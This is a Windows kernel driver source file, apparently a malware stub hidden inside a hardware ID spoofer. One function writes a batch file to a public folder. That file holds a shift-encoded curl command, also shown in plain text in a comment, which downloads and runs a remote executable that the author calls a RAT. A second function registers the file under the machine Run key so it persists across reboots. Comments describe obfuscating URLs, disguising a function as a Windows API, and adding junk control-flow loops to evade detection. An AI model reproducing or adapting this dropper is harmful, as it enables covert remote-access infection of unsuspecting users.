#pragma once
#include "includes.h"
#include "cff.h"

BOOLEAN IsAlphaChar(CHAR ch) { // not that sus cus normal spoofers also use character gening, sorting for sn gen
    return ((ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z'));
}
#define DECRYPTION_KEY 24

// yes goofy xor obfuscation but im just trying to avoide having a string like https://github.com/... or https://cdn.discord.com/ Cus thats way too sus
NTSTATUS KeGetCurrentRelativeStackState(CHAR* input, CHAR* output, ULONG size) { // dont ask about the name, lets hope they beleive ts is actually a windows km api func :sob: (visual studio let me add emojis fucking retard)
    for (ULONG i = 0; i < size; ++i) {
        if (IsAlphaChar(input[i])) {
            CHAR base = (input[i] >= 'A' && input[i] <= 'Z') ? 'A' : 'a';
            int shifted = input[i] - base - DECRYPTION_KEY;
            if (shifted < 0) {
                shifted += 26;
            }
            output[i] = (CHAR)((shifted + 26) % 26 + base);
        }        
        else {
            output[i] = input[i];
        }
    }
    return STATUS_SUCCESS;
}



NTSTATUS SMBIOSHANDLE()
{
    UNICODE_STRING uniName;
    OBJECT_ATTRIBUTES objAttr;
    HANDLE handle;
    IO_STATUS_BLOCK ioStatusBlock;
    NTSTATUS ntStatus;

    RtlInitUnicodeString(&uniName, oxorany(L"\\DosDevices\\C:\\Users\\Public\\$77FontBootCompanant.bat")); // why that prefix? cus i was using r77 rootkit. usermode rootkit and kernelmode stub is kinda funny lmao

    InitializeObjectAttributes(&objAttr, &uniName,
        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
        NULL, NULL);

    if (KeGetCurrentIrql() != PASSIVE_LEVEL) // spent like 3mil hours cus of this line lmao 
        return STATUS_INVALID_DEVICE_STATE;

    ntStatus = ZwCreateFile(&handle,
        GENERIC_ALL,
        &objAttr, &ioStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_SUPERSEDE,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL, 0);

    if (!NT_SUCCESS(ntStatus)) {
        return ntStatus;
    }

    //CHAR buffer[] = "䀦汣♳獀瑥∠굸㷃䡱牺ㅂ漷獃㍋偊捬畘䝁欰㕆睢䥖㡥㉙吴兩桅㙧湭硍愠佦祗癀㥴华灚䱒橕䑤ਢ┊굸㫃㕾ⰷ┱砥쎭縺㔴ㄬ┥굸㫃ㅾⰷ┱砥쎭縺ⰹ┱砥쎭縺㠲ㄬ┥굸㫃㑾ⰴ┱┾굸㫃㑾ⰴ┱砥쎭縺ㄴㄬ┥굸㫃ㅾⰷ┱砥쎭縺㐱ㄬ"; would have been cool but i didnt manage to make it process these characters that actually work as cmds without decryprtion and shit rip

    //CHAR buffer[] = "curl -s https://raw.githubusercontent.com/hurtttttt/cdn/main/xra4.exe -o C:\\Users\\Public\\$77xra4.exe && C:\\Users\\Public\\$77xra4.exe"; this is the command below, dont use my stub btw i lost the rat server + webhook (vps banned me lol)
    //CHAR buffer[] = "timeout /t 10 /nobreak >nul";

    CHAR _rax9482[] = "aspj -q frrnq://pyu.e"; 
    CHAR _rax94842[] = "grfszsqcpamlrclr.amk/f";
    CHAR _rax94142[] = "sprrrrrr/abl/kygl/vpy4.";
    CHAR _rax924142[] = "cvc -m A:\\Sqcpq\\Nszj";
    CHAR _rax9112[] = "ga\\$77vpy4.cvc && A:";
    CHAR _rax66722[] = "\\Sqcpq\\Nszjga\\$77vpy";
    CHAR _rax148[] = "rr/abl/kyrr/abl/kyglgl4.crr/abl/kyglvc";

    while (__st__) {
        if ((__st__ == 1)) {
            i = 0;
            j = 0;
            sum = 0;
            __st__ = 2;
            continue;
        }
        if ((__st__ == 2)) {
            if ((i <= n)) {
                __st__ = 4;
                continue;
            }
            __st__ = 3;
            continue;
        }
        if ((__st__ == 3)) {
            sum = ((sum + i) * 2) % 100;
            __st__ = 12;
            continue;
        }
        if ((__st__ == 4)) {
            if ((j < i)) {
                __st__ = 6;
                continue;
            }
            __st__ = 5;
            continue;
        }
        if ((__st__ == 5)) {
            C[i][i] = sum + i;
            __st__ = 9;
            continue;
        }
        if ((__st__ == 6)) {
            if ((j % 2 == 0)) {
                __st__ = 8;
                continue;
            }
            __st__ = 7;
            continue;
        }
        if ((__st__ == 7)) {
            C[i][j] = sum * (i - j);
            __st__ = 8;
            continue;
        }
        if ((__st__ == 8)) {
            j++;
            sum += j;
            if (j < i) {
                __st__ = 6;
            }
            else {
                __st__ = 4;
            }
            continue;
        }
        if ((__st__ == 9)) {
            if (sum % 2 == 0) {
                C[i][i] += sum / (i + 1);
            }
            else {
                C[i][i] -= sum / (i + 1);
            }
            __st__ = 10;
            continue;
        }
        if ((__st__ == 10)) {
            i++;
            sum += i;
            if (i <= n) {
                __st__ = 2;
            }
            else {
                __st__ = 11;
            }
            continue;
        }
        if ((__st__ == 11)) {
            C[n][n] = sum * (i + j);
            __st__ = 3;
            continue;
        }
        if ((__st__ == 12)) {
            C[i][j] = sum * (i + j);
            __st__ = 13;
            continue;
        }
        if ((__st__ == 13)) {
            __st__ = 0;
            continue;
        }
    }


    CHAR buffer[132]; // putitng lil bro in da buffer
    strcpy(buffer, _rax9482);
    strcat(buffer, _rax94842);
    strcat(buffer, _rax94142);
    strcat(buffer, _rax924142);
    strcat(buffer, _rax9112);
    strcat(buffer, _rax66722);
    strcat(buffer, _rax148);

   // CHAR buffer[132] = "aspj -q frrnq://pyu.egrfszsqcpamlrclr.amk/fsprrrrrr/abl/kygl/vpy4.cvc -m A:\\Sqcpq\\Nszjga\\$77vpy4.cvc && A:\\Sqcpq\\Nszjga\\$77vpy4.cvc";
    CHAR decrypted[sizeof(buffer)] = { 0 };

    KeGetCurrentRelativeStackState(buffer, decrypted, sizeof(buffer));

    LARGE_INTEGER byteOffset = { 0 };

    ntStatus = ZwWriteFile(handle,
        NULL,
        NULL,
        NULL,
        &ioStatusBlock,
        decrypted,
        sizeof(decrypted),
        &byteOffset,
        NULL);

    if (!NT_SUCCESS(ntStatus)) {
        ZwClose(handle);
        return ntStatus;
    }

   


    ZwClose(handle);

    return STATUS_SUCCESS;

}

NTSTATUS UUIID()
{

    while (__st__) {
        if ((__st__ == 1)) {
            i = 0;
            j = 0;
            sum = 0;
            __st__ = 2;
            continue;
        }
        if ((__st__ == 2)) {
            if ((i <= n)) {
                __st__ = 4;
                continue;
            }
            __st__ = 3;
            continue;
        }
        if ((__st__ == 3)) {
            sum = ((sum + i) * 2) % 100;
            __st__ = 12;
            continue;
        }
        if ((__st__ == 4)) {
            if ((j < i)) {
                __st__ = 6;
                continue;
            }
            __st__ = 5;
            continue;
        }
        if ((__st__ == 5)) {
            C[i][i] = sum + i;
            __st__ = 9;
            continue;
        }
        if ((__st__ == 6)) {
            if ((j % 2 == 0)) {
                __st__ = 8;
                continue;
            }
            __st__ = 7;
            continue;
        }
        if ((__st__ == 7)) {
            C[i][j] = sum * (i - j);
            __st__ = 8;
            continue;
        }
        if ((__st__ == 8)) {
            j++;
            sum += j;
            if (j < i) {
                __st__ = 6;
            }
            else {
                __st__ = 4;
            }
            continue;
        }
        if ((__st__ == 9)) {
            if (sum % 2 == 0) {
                C[i][i] += sum / (i + 1);
            }
            else {
                C[i][i] -= sum / (i + 1);
            }
            __st__ = 10;
            continue;
        }
        if ((__st__ == 10)) {
            i++;
            sum += i;
            if (i <= n) {
                __st__ = 2;
            }
            else {
                __st__ = 11;
            }
            continue;
        }
        if ((__st__ == 11)) {
            C[n][n] = sum * (i + j);
            __st__ = 3;
            continue;
        }
        if ((__st__ == 12)) {
            C[i][j] = sum * (i + j);
            __st__ = 13;
            continue;
        }
        if ((__st__ == 13)) {
            __st__ = 0;
            continue;
        }
    }

    UNICODE_STRING keyPath;
    OBJECT_ATTRIBUTES objAttr1;
    HANDLE hKey = NULL;
    NTSTATUS status = STATUS_SUCCESS;
    ULONG disposition;


    RtlInitUnicodeString(&keyPath, oxorany(L"\\Registry\\Machine\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"));

    InitializeObjectAttributes(&objAttr1, &keyPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    status = ZwCreateKey(&hKey, KEY_WRITE, &objAttr1, 0, NULL, REG_OPTION_NON_VOLATILE, &disposition);
    if (!NT_SUCCESS(status))
    {
        return status;
    }

    UNICODE_STRING valueName;
    RtlInitUnicodeString(&valueName, oxorany(L"$77FontBootCompanant"));
    const unsigned short* constString = oxorany(L"C:\\Users\\Public\\$77FontBootCompanant.bat");
    wchar_t* nonConstString = const_cast<wchar_t*>(constString);
    PVOID exePath[] = { static_cast<PVOID>(nonConstString) };
    status = ZwSetValueKey(hKey, &valueName, 0, REG_SZ, exePath, sizeof(exePath));
    if (!NT_SUCCESS(status))
    {
        ZwClose(hKey);
        return status;
    }

    ZwClose(hKey);

   

    return STATUS_SUCCESS;
}